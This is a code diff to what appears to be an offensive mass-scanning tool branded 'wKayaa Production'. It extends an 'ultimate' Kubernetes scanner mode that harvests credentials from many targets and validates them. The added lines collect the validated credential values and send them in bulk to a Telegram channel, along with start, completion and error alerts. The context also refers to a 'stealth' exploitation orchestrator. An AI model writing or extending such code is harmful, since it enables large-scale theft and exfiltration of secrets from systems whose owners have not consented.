@@ -344,7 +344,7 @@ ALL SYSTEMS OPERATIONAL! 🚀"""
         await stealth_orchestrator.run_exploitation(targets)
     
     async def _run_ultimate_mode(self, targets):
-        """Mode ultimate - K8s Ultimate Scanner with advanced features"""
+        """Enhanced ultimate mode with large-scale support - K8s Ultimate Scanner"""
         print("🚀 MODE ULTIMATE - Advanced K8s Scanner with Enterprise Features")
         
         if not self.ultimate_scanner:
@@ -352,9 +352,28 @@ ALL SYSTEMS OPERATIONAL! 🚀"""
             return
         
         try:
-            # Run the ultimate scanner
-            print(f"🎯 Scanning {len(targets)} targets with ultimate capabilities")
+            # Configure for large scale if needed
+            target_count = len(targets)
+            print(f"🎯 Scanning {target_count:,} targets with ultimate capabilities")
+            
+            # Send large-scale start notification
+            if self.telegram_notifier and hasattr(self.telegram_notifier.telegram, 'send_large_scale_start'):
+                config_info = {
+                    'max_concurrent': getattr(self.ultimate_scanner.config, 'max_concurrent', 'Unknown'),
+                    'batch_size': getattr(self.ultimate_scanner.config, 'batch_size', 'Unknown'),
+                    'mode': 'ULTIMATE'
+                }
+                await self.telegram_notifier.telegram.send_large_scale_start(target_count, config_info)
+            
+            # Track performance metrics
+            start_time = datetime.utcnow()
+            
+            # Run the ultimate scanner with optimizations
             results = await self.ultimate_scanner.scan_targets(targets)
+            
+            # Calculate final statistics
+            end_time = datetime.utcnow()
+            duration = (end_time - start_time).total_seconds()
             
             # Update global statistics
             self.global_stats["ultimate_scan_results"] = len(results)
@@ -363,38 +382,78 @@ ALL SYSTEMS OPERATIONAL! 🚀"""
             # Count credentials
             total_credentials = sum(len(r.credentials) for r in results)
             validated_credentials = sum(len([c for c in r.credentials if c.validated]) for r in results)
+            success_rate = (validated_credentials/total_credentials*100) if total_credentials > 0 else 0
             
             self.global_stats["mail_credentials"] = total_credentials
             self.global_stats["validated_credentials"] = validated_credentials
+            self.global_stats["scan_duration"] = duration
+            self.global_stats["processing_rate"] = target_count / duration if duration > 0 else 0
             
             print(f"""
 🎯 ULTIMATE SCAN COMPLETE:
+├── Targets Processed: {target_count:,}
 ├── Services Found: {len(results)}
 ├── K8s Clusters: {self.global_stats['clusters_found']}
 ├── Total Credentials: {total_credentials}
 ├── Validated Credentials: {validated_credentials}
-└── Success Rate: {(validated_credentials/total_credentials*100) if total_credentials > 0 else 0:.1f}%
+├── Success Rate: {success_rate:.1f}%
+├── Duration: {duration:.1f}s ({duration/60:.1f} min)
+└── Processing Rate: {self.global_stats['processing_rate']:.1f} targets/sec
             """)
             
-            # Send Telegram notification if available
+            # Send completion notification if available
+            if self.telegram_notifier and hasattr(self.telegram_notifier.telegram, 'send_large_scale_complete'):
+                completion_stats = {
+                    'total_processed': target_count,
+                    'elapsed_seconds': duration,
+                    'found_services': len(results),
+                    'found_credentials': total_credentials,
+                    'validated_credentials': validated_credentials,
+                    'success_rate': success_rate,
+                    'peak_memory_mb': getattr(self.ultimate_scanner.large_scale_optimizer, 'memory_usage', 0) if hasattr(self.ultimate_scanner, 'large_scale_optimizer') else 0
+                }
+                await self.telegram_notifier.telegram.send_large_scale_complete(completion_stats)
+            
+            # Send summary for validated credentials
             if self.telegram_notifier and validated_credentials > 0:
-                telegram_msg = f"""🔥 ULTIMATE SCAN HIT!
-
-🎯 Target: Multiple
-💎 Session: {self.session_id}
-🔍 Mode: ULTIMATE SCANNER
-⚡ Results: {len(results)} services
-🔑 Credentials: {total_credentials} found, {validated_credentials} validated
-
-wKayaa Production - {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')}"""
+                # Extract validated credentials for summary
+                validated_creds = []
+                for result in results:
+                    for cred in result.credentials:
+                        if cred.validated:
+                            validated_creds.append({
+                                'service': cred.type,
+                                'type': cred.type,
+                                'value': cred.value,
+                                'validated': True,
+                                'confidence': cred.confidence if hasattr(cred, 'confidence') else 1.0
+                            })
                 
-                await self.telegram_notifier.telegram._send_telegram_message(telegram_msg)
+                if validated_creds and hasattr(self.telegram_notifier.telegram, 'send_bulk_credentials_summary'):
+                    await self.telegram_notifier.telegram.send_bulk_credentials_summary(validated_creds)
+                
                 self.global_stats["telegram_alerts"] += 1
             
         except Exception as e:
             print(f"❌ Ultimate scanner error: {e}")
             import traceback
             traceback.print_exc()
+            
+            # Send error notification if possible
+            if self.telegram_notifier:
+                error_msg = f"""❌ ULTIMATE SCAN ERROR
+
+🚨 Session: {self.session_id}
+🎯 Targets: {len(targets):,}
+💥 Error: {str(e)[:200]}
+
+⏰ {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')}
+wKayaa Production - Error Handler"""
+                
+                try:
+                    await self.telegram_notifier.telegram._send_telegram_message(error_msg)
+                except:
+                    pass  # Don't fail if notification fails
     
     async def _run_all_modes(self, targets):
         """Mode ALL - Tous les modules en parallèle"""
